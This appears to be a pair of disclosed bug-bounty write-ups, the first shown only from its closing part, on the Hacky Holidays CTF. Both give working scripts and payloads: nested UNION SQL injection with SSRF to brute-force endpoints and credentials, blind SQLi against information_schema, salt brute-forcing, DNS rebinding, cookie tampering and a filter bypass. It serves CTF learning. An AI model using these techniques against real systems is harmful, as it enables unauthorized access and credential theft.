This rendered a broken image on the site, and visiting the image URL: [`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2VuZHBvaW50IiwiYXV0aCI6IjliYzdkOWFhOTRlZTZkNTQyZGYyYzNjZWZjYWRlNjgxIn0=`](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2VuZHBvaW50IiwiYXV0aCI6IjliYzdkOWFhOTRlZTZkNTQyZGYyYzNjZWZjYWRlNjgxIn0=) gave a custom error message - `Expected HTTP status 200, Received: 404`

And according to the API documentation it was an invalid endpoint.

{F1133191}

Now, what we have to do is to find a valid endpoint and in order to do that, it is a 3 step process.

1. Bruteforce with a wordlist.
2. For each word, check the response
3. And if the response if not `Expected HTTP status 200, Received: 404`, we get a hit.

So, to achieve that we had to do a bit of scripting,

```bash
#!/bin/bash
# find_endpoints.sh : Script for finding the valid endpoint
# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}

word=$1

url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/${word}'--%20-%22,2,3--%20-"

# extracting image path
path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

img_url="https://hackyholidays.h1ctf.com${path}"

if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 404" ]]; then 
        echo "${word}:${img_url}"
fi
```

And looping this script through the [common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) gave us two hits,

```shell
$ cat common.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
user:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==
ping:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3BpbmciLCJhdXRoIjoiOTMzZTJkMzk5NWE4MmIzZmQyODE1NWQyMjg3MDk1M2YifQ==
```

`user` and `ping`(a rabbit hole -.-) , `user/` seems to be interesting, so we can continue to enumerate on that, we can make few tweaks on the previous scripts to bruteforce for parameters, if we try for some random parameter with some random value, it gives us an error - `Expected HTTP status 200, Received: 400` i.e. Invalid GET/POST request. So, we can use this error message to enumerate on the parameter (`FUZZ?=anything`)

```bash
#!/bin/bash
# find_endpoints.sh : Script for finding the valid endpoint
# Usage: cat wordlist.txt | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}

url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/?${word}=anything'--%20-%22,2,3--%20-"

# extracting image path
path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

img_url="https://hackyholidays.h1ctf.com${path}"

if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 400" ]]; then 
        echo "${word}:${img_url}"
fi
```

And looping over the script gave, two parameters `username` and `password`.

```shell
$ cat test.txt  | xargs -I {} -n 1 -P 10 ./find_endpoints.sh {}
username:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9YW55dGhpbmciLCJhdXRoIjoiZTkwN2ZmZTJiZDFjYTc1YmI5ODliYjFkYTZiYTAwNDAifQ==
password:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQ9YW55dGhpbmciLCJhdXRoIjoiNWI1MGQ3MTVjZjYyYmRmYjY4ZWQ1ZGQ1YzU3ZDBkMDgifQ==
```

Now that we have username and password parameters we can starting looking for it's values, to check for any error message we try - `user?username=a` to get `Expected HTTP status 200, Received: 204`. Now we know what to negate to. But how is this searching in database? Theory:

```sql
select * from user where username like "whatever";
select * from user where username like "w%"; # if we don't know the complete thing
```

So, if we have to guess character by character we have to use wild card characters - `%` allows all the character, so we can use it like - `a%` to check if `a` is the first character or not. To do it manually, it will be too much of work, so let's script it out,

```bash
#!/bin/bash
# find_credentials.sh: Script for finding the valid credentials

charset=$(echo {a..z} {A..Z} {0..9})

# Extracting Username
ct=0
found=""
res=""
echo "[*] Finding Username..."
while [[ $ct -le 36 ]]; do
        ct=0
        for char in $charset
        do
                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,'../api/user?username=${found}${char}%'--%20-%22,2,3--%20-"

                # extracting image path
                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

                img_url="https://hackyholidays.h1ctf.com${path}"
                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
                        echo ${char}
                        res=$res$char
                        found=${found}${char}
                        break 1
                fi
                ct=$(( ct+1 ))
        done
done
echo "Username: ${res}"

# Extracting Password
ct=0
found="s"
echo "[*] Finding Password..."
while [[ $ct -le 62 ]]; do
        ct=0
        for char in $charset
        do
                url="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%22-1'%20UNION%20ALL%20SELECT%20%22-1'%20union%20all%20select%20NULL,NULL,%27../api/user?password=${found}${char}%%27--%20-%22,2,3--%20-"

                # extracting image path
                path=$(curl -s $url | awk -n '/<img class="img-responsive" src="/,/">/' | cut -d '"' -f4)

                img_url="https://hackyholidays.h1ctf.com${path}"
                if [[ $(curl -s $img_url) != "Expected HTTP status 200, Received: 204" ]]; then 
                        echo ${char}
                        found=${found}${char}
                        break 1
                fi
                ct=$(( ct+1 ))
        done
done
echo "Password: ${found}"
echo "Done!"
```

Yields:

```shell
Username: grinchadmin
Password: s4nt4sucks
```

And we can use this username and password to log in to "Attack Box", where we get the flag.
{F1133193}


## Flag 12 - The End Game - "Attack Server"

Objective - **Stop the DDOS Attack.**

URL -  **`https://hackyholidays.h1ctf.com/attack-box`**
This is the final day of the "Hacky Holidays" and Grinch is ready to launch a DDOS attack on Santa's Servers. 
{F1133194}

When we try to launch the attack, what it does is it passes a payload as a GET request, and then that URL is redirected to another to open up a web based terminal which pings the IP of the Santa's Server.

```
https://.../attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

When we decode the payload it decodes to,

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Upon playing with the payload, a few things came to attention,

- The IP cannot be changed directly, without changing the hash
- There is validation of IP format and only accepts `[a-z][A-Z][0-9].`

So, we have to create a hash for the IP that we want to ping.

If we want to stop the Grinch, what we need to do is take down the services of the network, so in order to do that,  we can ping flood the Grinch's server.

So, let's see how we can break down the parts and solve each one of them.

### Make a way to ping any other IP.

In order to ping some IP we have to provide a protection hash along with it, in the base64 encoded payload. We have to find out a way to generate such hashes.

Passing the hash through crackstation gave nothing useful, so the hash must be having salt in it. So, what we can do is try to guess the salt, but what else the hash is containing - rough guess - it's the IP associated with the hash in the payload. 

After guessing and trying out combinations for sometime, it was evident that the hash is generated as `concatenation of salt and IP`.

A small script to bruteforce for the salt, would do the work

```python
# get_salt.py - finds salt of the hash by bruteforcing using rockyou.txt.
# Usage: python get_salt.py rockyou.txt
import sys, hashlib

file_path = sys.argv[1]
with open(file_path,'r', errors='replace') as f:
    words = f.readlines()

for word in words:
    result = word.strip()+'203.0.113.33'
    result = hashlib.md5(result.encode())

    if result.hexdigest() == "5f2940d65ca4140cc18d0878bc398955":
        print(word)
        break
```

So, it yields out the salt

```shell
mrgrinch463
```

Now, we have the salt, so we can use it to regenerate the hash for any IP that we want.

```
mrgrinch463<IP>
```

Pinging the [localhost](http://localhost) (127.0.0.1) was not helpful as the server does not allow that.
{F1133196}
{F1133195}
{F1133197}

So, it does not allows, us to ping directly, so we have to find some different way, it basically works in three step process

- Input the URL - it then resolves with DNS
- Checks if the resolved IP is not equal to 127.0.0.1
- If true, it continues to ping the URL

So, we have to first pass the check and then use it. This can be done using **DNS Rebinding (TOCTOU - Time of Check. Time of Use Vulnerability)**

Implements the DNS Rebinding using concept from this GitHub repo - [`https://github.com/taviso/rbndr`](https://github.com/taviso/rbndr)

```
7f000001.c0a80001.rbndr.us
```

The above mentioned URL will help in easy switch between the two IPs implemented in hex.

`7f000001` - 127.0.0.1

`c0a80001` - 192.168.0.1

So, when we ping the above URL, it resolves to 192.168.0.1 or 127.0.0.1, as the server randomly returns one of the addresses.

So, with a bit of luck and several tries by crafting a payload as below,

```
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}

eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```

And, sent this payload for a few times and the time it was successful, it passed the check with 192.168.0.1 and pings 127.0.0.1 and the challenge is complete.
{F1133187}
{F1133188}

Thanks to Adam Langley and team for putting up such an awesome CTF. It was a great learning experience. :)

## Impact

The attacker was able to stop the DDOS Attack on Santa's Servers.

---

### [Invading Grinch Network and Saving Christmas](https://hackerone.com/reports/1065829)

- **Report ID:** `1065829`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @w31rd0
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:56:36.997Z
- **CVE(s):** -

**Vulnerability Information:**

#How we saved Christmas

As usual with H1 CTF challenges we are provided with a target URL. In our case it is the following:
https://hackyholidays.h1ctf.com/

We started by visiting the URL and see what is going on. All we could see is a page with an image with a warning message. 

{F1125722}

We quickly view the source code, for any potential hidden hint as a comment. All we could find was some URLs for the hosted content pointing to /assets/ but access there was Forbidden

##**Day 1**

1) We start our enumeration via running a directory enumeration tool.

```shell
./dirsearch -u https://hackyholidays.h1ctf.com/ -e php,txt,jsp
```

2) We get the file /robots.txt in the results. By visiting it we can see the first flag.
`flag{48104912-28b0-494a-9995-a203d1e261e7}`
We also notice a new directory named `s3cr3t-ar3a`. Once we try to visit it, we see that we have to wait for the second day of the event.

{F1115429}

##**Day 2**

1) Day 2 starts and the secret area  page is now updated, with a message indicating that the page has been moved. Therefore we start some subdomain enumeration in the background, just in case and take a closer look into the page.

2) In the source code we can see after a bit the 2nd flag hiding, as also a hint for the next part of the challenge  hinting that there will be an`/apps` directory
`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

{F1115427}

##**Day 3**

1) Third day and we visit the home page, we now see a button that leads as to the following URL as expected based on day2's "awesome" recon.
https://hackyholidays.h1ctf.com/apps

We see a button and once clicked we open a new URL 
https://hackyholidays.h1ctf.com/people-rater

There are some buttons on the page that once clicked pop up an alert box with some *evil* message.

2) We open developer tools to have a closer look and on the network tab we see that for each button a request is sent containing an `id` parameter which includes a base64 encode JSON value such as the following:
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=

3) Once decode we can see that it is a id numeric value. Going through multiple buttons and decoding the URL we can see that they are incremental values.  However we notice that the values start from `id:2` and go up, id of value 1 is missing. 

4) We therefore create a new JSON value with `{"id":1}` and base64 encode it and pass it as a parameter to the above request.
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=

We can now see the third flag.
flag{b705fb11-fb55-442f-847f-0931be82ed9a}

{F1117733}

##**Day 4**

1) We see a new application at the following URL
https://hackyholidays.h1ctf.com/swag-shop

We notice that in order to purchase an item, we need to authenticate. However it is not possible to perform username enumeration or bypass the login via SQLi, so we need another approach.

2) We start fuzzing the /api endpoint to see if there is something hidden and not present in the source code. which exposes some API endpoints We discover the following endpoints which look interesting
```
/sessions
/user
```
3) By visiting the  URL [sessions](https://hackyholidays.h1ctf.com/swag-shop/api/sessions) we get multiple JWT looking values. We can decode them since the are base 64 encoded and see their content. One of the values stands out since it is longer than all others.  Following command can be used to see that one value contains a UID and rest are NULL

```shell
curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq -r '.user'
```
The following uid is extracted ` C7DCCE-0E0DAB-B20226-FC92EA-1B9043` and noted down

4)  Trying to use the session values and the cookie values within them doesn't wield any result. Therefore we go back to the /user endpoint. Once we visit it we get the following message

`{"error":"Missing required fields"}`

This is a good hint that we need to discover something more and we are on a right track.

5) We start fuzzing possible parameters on the URL below until we get a hit for the `uuid` parameter. We can then use the identified id from step 3 above and obtain the final flag.

https:////hackyholidays.h1ctf.com/swag-shop/api/user?=FUZZ

{F1117744}

**Url of 4th flag:** https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
`flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

{F1117735}

##**Day 5**

1) We visit our new target https://hackyholidays.h1ctf.com/secure-login
2) We start by investigating the login page. By providing some random credentials we notice that the login page returns an error message such as 
`Invalid Username` . This is a good indication of potential username enumeration.
3) We start fuzzing the username with a wordlist with name [1](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt). After a while we can notice that one response does not contain the `Invalid Username` error. Therefore we have identified a valid username for the application, which is the following
**Username:** access
4) Now we can attempt to bruteforce the password, hoping no rate limit/account lockout is in place. We can use a password list [2](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt) 
We quickly get a hit and  a redirect for the following password
**Password:** computer
Therefore the following credentials allow access `access:computer`
However on the new screen we see that they are no files to download.
5) We notice though that the cookie set is base64 encoded and once decoded it contains the following values.
`{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`
6) Admin is set to false, however there is no integrity validation, which might allow tampering with the cookie. We set admin to true and base64 encode the cookie. which gives us the following value. We then can set it as our cookie(securelogin) value in the browser
`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`
7) Once page is refreshed we have access to a zip file which we can download. When we try to unzip the file though, we are asked to provide a password.

{F1121043}
8) We can use multiple approaches to this, but I used fcrackzip to perform a dictionary attack.
```shell
fcrackzip -v -D -u -p /rockyou.txt my_secure_files_not_for_you.zip
````
Instantly we get the password for the zip file which is `hahahaha`

{F1121044}
We can now unzip the file and obtain the flag, as also a naughty grinch image ;)
`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

##**Day 6**

1) Once new application button is clicked we are directed to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html
2) Any attempt for LFI or to use php filters seems to fail, so we proceed enumerating potential files. We notice that we can get a different response for index.php since it redirects to the page in step 1, while all other files return 404.
3) By trying to play a bit with the `template` parameter, hoping to get LFI we notice after a few attempt that the following URL will disclose source code 
`https://hackyholidays.h1ctf.com/my-diary/?template=index.php`
4) We notice that some filtering is happening with the following preg_replace lines
```php
$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
$page = str_replace("admin.php","",$page);
$page = str_replace("secretadmin.php","",$page);
```
5) So we see that special characters are removed, besides alphanumeric and the dot. Also if the keyword admin.php is detected its stripped, same for the secretadmin.php afterwards. The order of processing is important here, to craft a valid payload, which will bypass the checks and allow us to access
`secretadmin.php`
6) To do so we crafted the following URL  
https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretadmadmin.phpin.phpdmin.php
Below a representation is show of how the filtering will strip out parts of the provided input in the templates parameter, to allow us to convert our payload to the valid target file

{F1121060}
7) Now we can use the above URL and access the admin protected page and grab our flag (as also see grinch's evil plan)
`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

{F1121062}

##**Day 7**

1) New target is [Hate Mail Generator]( https://hackyholidays.h1ctf.com/hate-mail-generator)

2) We proceed with enumerating the application. 
We can see that there is a created email, which has some references to templates  via the following format `{{template:cbdj3_grinch_header.html}}` This can be a hint for later on so we note it down
We can also create our own emails. However when trying to send, we notice that we do not have enough credits. We can only preview the message. We  discover that XSS is possible via the body of the preview request. Example below

`preview_markup=Hello {{name}} ....&preview_data={"name":"<script>alert</script>","":"@test.com"}`

Since though we can not send this data it will not be possible to achieve XSS for now, if we do not bypass the credit check somehow.

3) We also run a directory enumeration and we discover the following endpoint which has also directory listing enabled.
https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
Within that directory a specific template stands out which is our potential target `38dhs_admins_only_header.html `

4) We attempt to create an email and include the payload, but we notice that the application returns the following message

`You do not have access to the file 38dhs_admins_only_header.html`

5) We need to bypass this somehow and access the template.  We notice that the `preview_markup` parameter applies some filtering, striping out special characters like `/` etc

6) Since the `preview_data` parameter has not filtering we decide to fuzz and attempt to tamper with it. We finally discover that we can include templates from the `preview_data` with a reference in the `preview_markup`. 
Therefore we can use a payload like the following to bypass the access restriction and get the flag. 

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 100
<--Redacated-->

preview_markup=Hello {{name}}....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}"
```
`flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

{F1121586}

##**Day 8**
1) New target is [Evil Forum](https://hackyholidays.h1ctf.com/forum/)
2) We start our enumeration and we discover a few usernames
- grinch
- max

Two login pages
- https://hackyholidays.h1ctf.com/forum/login
- https://hackyholidays.h1ctf.com/forum/phpmyadmin

Attempting to bruteforce both does not wield any successful result
3) We progress with further enumeration and we perform some OSINT also. We end up using the challenge creator's name in github to find his profile
https://github.com/adamtlangley

Under that and towards the bottom of the page we can see a repository:
https://github.com/Grinch-Networks/forum

4) We visit the repository and after examining the code for a while we can not see anything sensitive leaked, So we check the commit history. We can find after a whie the following commit [Initial Code Commit](https://github.com/Grinch-Networks/forum/commit/07799dce61d7c3add39d435bdac534097de404dc) which leaks some credentials

```php
self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
```
5) We can now use the credentials above and connect to the /phpmyadmin endpoint. Within it we discover  a table named `user` which has the two users discovered befored and their hashed md5 passwords. User grinch also has administrative privileges, therefore can view any post in the forum.

{F1122501}
6) By visiting [crackstation](https://crackstation.net/) we can attempt to see if the hash already exists and we are able to obtain the actual password of the user.
**Password:** BahHumbug

{F1122503}
7) We can now login as the grinch user and view the hidden post and obtain the flag

**Login credentials**
- grinch:BahHumbug

**Flag post:**
- https://hackyholidays.h1ctf.com/forum/3/2

`flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

{F1122502}

##**Day 9**

1) New target is [Evil Quiz](https://hackyholidays.h1ctf.com/evil-quiz)

2) We see an input field with a username, once submitted we have to answer 3 questions and then we end up seeing results for our questions, as also a message about how many other users use that exact username. XSS payloads will not work here, since special characters are encoded and it would be a self-XSS most likely.
Since there is a comparison with a Database of usernames we proceed with attempting a simple SQL injection payload.
**Plain Username Result**
With our username `w31rd0` we receive a result of 1 user sharing the same username

{F1123369}

**Username Evaluates to TRUE**
With the following payload `w31rd0' OR 1=1-- -` the SQL query will evaluate to TRUE, since we can break the initial query and insert a statement that always evaluates to TRUE

{F1123373}

The above evidence is sufficient enough to confirm the existence of SQL injection. However it is boolean-based second order, since our results can not be viewed directly when submitted and the validity of the query is based on the string returned.

3) After identifying the database type/version, we proceed with attempting to identify the table names.
To do so we can use an injection like the following
```sql
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) = 113-- -
```

**Apporach Methodology:**
- The above query will attempt to compare the first letter of the first database with an ASCII value (in our case 113 is equivalent to character **r**)
- To decrease the number of request we can try to use different comparison operators (e.g. we can do
```sql
' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 113-- -
```
- Then by querying the [score](https://hackyholidays.h1ctf.com/evil-quiz/score) endpoint, we can see if the query evaluates to TRUE or not, based on the result for the usernames
- If the result gives `0 other player(s) `, the query is FALSE. On the contrary if we get a value higher that zero, the query is TRUE, therefore we have identified the first letter of the first database.
- We can continue with the next letter (or by adapting our request if we used the <, > operators) until we get the entire name of our target.
- Move to the next entry (for the databases)

Proceeding with this approach we can get the name for the second database which looks interesting
`Target DB name: quiz`

4) We then can proceed with identifying the tables within the database with a similar approach as with the database names.
We obtain the following table name which seems the one we need
`Target Table name: admin`

5) Next we enumerate the column names for the admin table.
We obtain the following columns names which seem interesting
`Target Column names: username, password`

6) Now having knowledge of the table structure we can exfiltrate data with a query like the following
```sql
test' AND (ascii(substr((SELECT password FROM quiz.admin LIMIT 0,1),1,1))) = 112--  -
```
Injection Request:

{F1123397}

Injected query for password letter exfiltration evaluates to TRUE:

{F1123399}

After a while we obtain the following credentials
`admin:S3creT_p4ssw0rd-$`

Sadly my programming skills are totally bad, however i attempted to make a script that will automate the extraction of each letter (F1123459).
Its not efficient enough, however it will display the first letter of the username. By editing the script we can continue bruteforcing the remaining letters.
The script include also the payloads for the tables, columns which are commented out

7) We can now login in the admin panel [Admin](https://hackyholidays.h1ctf.com/evil-quiz/admin)
And obtain the flag.
`flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

##**Day10**

1) New target is [Signup-Manager](https://hackyholidays.h1ctf.com/signup-manager/)

2) We poke around a bit to examine the application. We notice in the while inspecting element a comment on the top
`<!-- See README.md for assistance -->`

3) Visiting the [README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md) we get a file. Once opened we can see a few hints with the following stadning out
```
2) Move signupmanager.zip into the new directory and unzip it.
6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7) Default login is admin / password
```
4) Default credentials will not work, therefore they have been probably changed. We try to visit the descriptibed location for the .zip file and we manage to access it and download it.  [signupmanager.zip](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip)

5) Extracting the contents we see multiple .php files. However the most interesting one is the index.php
Within the file we can see all the processing that happens during the signup and creation o user accounts which is the functionality that has the most potential to be vulnerable.

What we notice is that the username, firstname and lastname are filtered and only a substring of the provided input is used (first 15 characters after all special characters have been removed and only alphanumerics remain)
```php
$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
```

Also the following function is the one of interest since it checks if the account has administrative privileges. The most important part is the last line. It will check the 112 character and if if matches a Y it will be validated to TRUE.
```php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
```
Also the following code is responsible for constructing the string that will be ented in the users.txt file once a user registers and will be checked with the  above function.

```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
//Pads parameters to reach 15chars by adding # and start concatinating the parameters
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

From analyzing the above code its apparent that we can not use the username, firstname, lastname in a malicious way since they are heavily sanitised.
We see though that the age parameter has less strict checks such as:
```php
if (!is_numeric($_POST["age"]))
if (strlen($_POST["age"]) > 3)
```

Once those check are passed the following happens
```php
$age = intval($_POST["age"]);
```

This is interesting based on this post [intval processing PHP 7](https://www.php.net/manual/en/function.intval.php#120543)
we can notice that  `intval('1e5');` will return 100000.
This fits perfectly our purpose. Since now by adding the additional values, we can overide the  ` $line .= 'N';` which is set by default and change it to Y which will grant us administrative privilleges.

**Signup Request to Obtain Admin Privileges**
```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 105
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
<--REDACTED-->

action=signup&username=w31rdtest&password=password&age=1e5&firstname=loadsofys&lastname=abcdefgabcdeYYY
```
Then we can login with the above credentials and access the hidden message with the flag.

{F1124657}

##**Day 11**

1) New target is [Recon Server](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59) based on the message from Day 10.

2) After a lot of recon and attempts we discover that an SQLinjection exists on the following URL on the `hash` parameter
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=

3) Also we have identified that the images hosted on the server are retrievable via a base64 value, which include an auth token that validates the file. If the authentication token is off, the file retrieval will fail, with a message that the authentication token is wrong.

**Encoded File Retrieval object:**
```
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
```
**Decoded Object**
```json
{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
```

4) Furthermore the challenge mentions the /api/* endpoint. However once we try to enumerate API endpoints we see a message.
```json
"error":"This endpoint cannot be visited from this IP address"
```
This is a strong indication of SSRF to be required to access API endpoints.

5) After a lot of trial and error (and then Adam's hint), trying to reverse the auth MD5 creation is not possible. Also dumping the content via the SQLi does not give any additional information, besides what we already have.
After tampering with our injection (and brainstorming with all the  other troubled players), it seems that we can use the SQLi to nest additional queries, once the query is processed by the server it will also be singed with an MD5 hash that is generated and create the image object. Now the image object can successfully retrieve the desired files

6) Based also on the API response [codes](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api), we can identify if endpoints and parameters exist or not. Based on that we are able to identify that the `/user` endpoint exists and that it also accepts two parameters `username` and `password`

An example injection is the one below which will return the following message
`Expected HTTP status 200, Received: 204`

SQL Query
```sql
' UNION SELECT "' union select 1,2,'../api/user?username=grinch'#",1,2# 
```

Injected URL
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27+UNION+SELECT+%22%27+union+select+1%2C2%2C%27..%2Fapi%2Fuser%3Fusername%3Dgrinch%27%23%22%2C1%2C2%23
```
The above URL as described creates the signed image that can be accessed by the following URL where the `data` parameter contains the base64 encoded JSON data with the URL and the auth MD5 hash.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9Z3JpbmNoIiwiYXV0aCI6IjEzYTVjMDg4NTFiNjdmNTg5ZDQ1NDBjZGJhMzE2NDhiIn0=
```

7)After a lot of additional fails, and attempting to identify more API endpoints and parameters, we had no luck. So we went back to the /api/user endpoint. We started fuzzing the username parameter and we identified some strange behavior.

 We run our fuzzer (we can adapt the one from day10) against the username, and we notice that  by injecting into the username parameter payloads it would return `Invalid content type detected` for one 1 specific character. We have also included the % character which can be interpreted as  `anything` in database queries. Therefore we can assume that this is a TRUE clause, so we might be able to brute-force the username character by character based on boolean based SQLinjection.

On the below injection, we can inject between the $$ symbols (those are removed in the script just added here to highlight the injection point).

Injection URL:
```sql
' UNION SELECT "' union select 1,2,'../api/user?username=grincha$$%&password=%25'#",1,2#
```
Below we can observe that a TRUE clause is confirmed via the error message and that the next letter on grincha is `d`.

{F1127289}

We can perform the same brute-force for the password value, since we have already identified that its one of the parameters accepted by the user API endpoint. After a while we can end up with the final set of credentials.

`grinchadmin:s4nt4sucks`

8) We can now go to https://hackyholidays.h1ctf.com/attack-box/login and login to obtain the flag
`flag11=flag{07a03135-9778-4dee-a83c-7ec330728e72}`

{F1127290}

##**Day 12**

1) New target is https://hackyholidays.h1ctf.com/attack-box

2) We can see that there are some buttons that will send a request with a base64 encoded parameter. Once decoding the value we notice the following content
```json
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
```
So the above object sets the target, but also hash a sanity check for tampering (the hash value). If we try to edit that value, the validation will fail and the attack will not start.

